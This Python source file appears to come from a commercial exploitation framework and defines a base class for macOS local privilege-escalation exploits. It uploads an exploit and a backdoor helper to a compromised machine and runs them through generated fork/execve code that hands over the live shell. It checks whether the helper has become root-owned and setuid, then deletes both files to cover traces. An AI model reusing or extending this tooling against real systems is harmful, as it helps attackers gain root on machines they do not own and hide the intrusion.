#!/usr/bin/env python

"""
osxLocalExploit.py - Stubs for OS X locals
"""
import sys
import time
import re
import logging

from collections import OrderedDict

if "." not in sys.path:
    sys.path.append(".")

from ExploitTypes.localexploit import LocalExploit


class osxLocalExploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.local_helper_32 = "backdoors/osx-mosdef-upgrade-32"
        self.local_helper_64 = "backdoors/osx-mosdef-upgrade-64"

        self.remote_exp      = ""
        self.remote_helper   = ""

    #
    # stat remote path
    #
    def stat_file(self, path):
        O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
        fd = self.node.shell.open(path, O_RDONLY, 0755)
        if fd < 0:
            logging.error('Could not open %s' % path)
            return {}

        ret, stat = self.node.shell.fstat(fd)
        self.node.shell.close(fd)
        if ret == 0:
            # self.log('[+] st_mode: %x' % stat['st_mode'])
            # self.log('[+] st_uid: %x' % stat['st_uid'])
            return stat
        else:
            logging.error('fstat() failed (%d)' % ret)
            return {}

    #
    # returns True if node is 32bit
    #
    def is_32bit_node(self):
        if hasattr(self.node.shell, "LP64") and self.node.shell.LP64:
            logging.warning("Node is 32bit: False")
            return False
        else:
            return True

    #
    # returns True if node is 64bit
    #
    def is_64bit_node(self):
        if hasattr(self.node.shell, "LP64") and self.node.shell.LP64:
            return True
        else:
            logging.warning("Node is 64bit: False")
            return False

    #
    # used for running either exploit or helper on target remote node
    # Caveats:
    # - self.remote_helper is your remote helper path
    # - self.remote_exp is your remote exploit path
    # - we now have the ability to pass an argv for both our helper and
    #   exploit execution:
    #   - order of arguments is fundamental:
    #   argv = {"mosdeftype_ID": "value", "mosdeftype_ID + 1": "another_value"}
    #
    #   e.g.
    #   argv = {"string_1": "/tmp/path1", "int_2": 4, "string_3": "/tmp/path2"}
    #
    def fork_and_exec(self, command, argv = None, envp = None, wait = 0):
        len_argv = 3 # default argv size
        len_envp = 1 # default envp size

        if argv:
            len_argv = 2 + len(argv)
            # reorder based on key
            argv = OrderedDict(sorted(argv.items(), key=lambda t: t[0]))

        if envp:
            len_envp = len_envp + len(envp)

        if not self.remote_helper:
            logging.error("self.remote_helper not set inside exploit class")
            return 1

        if not self.remote_exp:
            logging.error("self.remote_exp not set inside exploit class")
            return 1

        lvars            = {}
        lvars['COMMAND'] = command
        lvars['HELPER']  = self.remote_helper
        lvars['MOSDEF']  = '%d' % self.node.shell.fd
        lvars['WAIT']    = wait

        code = """
        #import "string", "COMMAND" as "COMMAND"
        """

        if command == self.remote_exp:
            code += """
        #import "string", "HELPER"  as "ARG1"
            """
        else:
            code += """
        #import "string", "MOSDEF"  as "ARG1"
        """

        if argv:
            for key_arg in argv:
                try:
                    arg_type    = re.match("(\w+)_.*", key_arg).groups()[0]
                except AttributeError, e:
                    logging.error("argv is not in the expected form")
                    return 0

                arg_name        = key_arg
                arg_value       = argv[key_arg]
                lvars[arg_name] = arg_value

                code += """
        #import "%s", "%s" as "%s"
                """ % (arg_type, arg_name, arg_name)

        if envp:
            for k in envp:
                v = envp[k]

                lvars[k] = "%s=%s" % (k, v)

                code += """
        #import "string", "%s" as "%s"
                """ % (k, k)

        code += """
        #import "int",    "WAIT"    as "WAIT"

        #import "local", "fork"    as "fork"
        #import "local", "execve"  as "execve"
        #import "local", "exit"    as "exit"
        #import "local", "sendint" as "sendint"
        #import "local", "waitpid" as "waitpid"


        void main()
        {
            char *argv[%d];
            char *envp[%d];
            int pid;

            argv[0] = COMMAND;
        """ % (len_argv, len_envp)

        if argv:
            i = 1
            for arg_name in argv:
                code += """
            argv[%d] = %s;
            """ % (i, arg_name)
                i += 1
        else:
            code += """
            argv[1] = ARG1;
        """

        code += """
            argv[%d] = NULL;
        """ % (len_argv - 1)

        if envp:
            for i, k in enumerate(envp):
                code += """
            envp[%d] = %s;
                """ % (i, k)

        code += """
            envp[%d] = NULL;
        """ % (len_envp - 1)

        code += """
            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, envp);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """

        ret = self.node.shell.runCode(code, lvars)
        return ret

    #
    # This one simply checks if the mosdef_helper has received privileges
    # through chown/chmod and waits <wait_secs> at max
    # if <wait_secs> is 0 it will simply check once if remote node is compromised
    #
    def compromised(self, mosdef_helper, wait_secs):
        if wait_secs > 0:
            while wait_secs:
                stat = self.stat_file(mosdef_helper)
                if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                    return True
                time.sleep(1)
                wait_secs -= 1

            if not wait_secs:
                return False
        else:
            stat = self.stat_file(mosdef_helper)
            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                return True
            else:
                return False

    #
    # cleanup remote node from both exploit module and helper
    # caveats:
    #  - Uses self.remote_exp and self.remote_helper
    #
    # Be sure to set them in your exploit
    #
    # Old logic, deprecated, still here for retrocompat
    # Superseeded by canvasexploit.add_file_for_cleanup()
    #
    def cleanup(self):
        self.nlog('Cleaning up')

        if self.remote_exp:
            if not self.nodeDeleteFile(self.remote_exp):
                logging.error("Error while removing exploit binary (%s)" % self.remote_exp)
        else:
            logging.error("self.remote_exp not set inside exploit class")

        if self.remote_helper:
            if not self.nodeDeleteFile(self.remote_helper):
                logging.error("Error while removing helper binary (%s)" % self.remote_helper)
        else:
            logging.error("self.remote_helper not set inside exploit class")
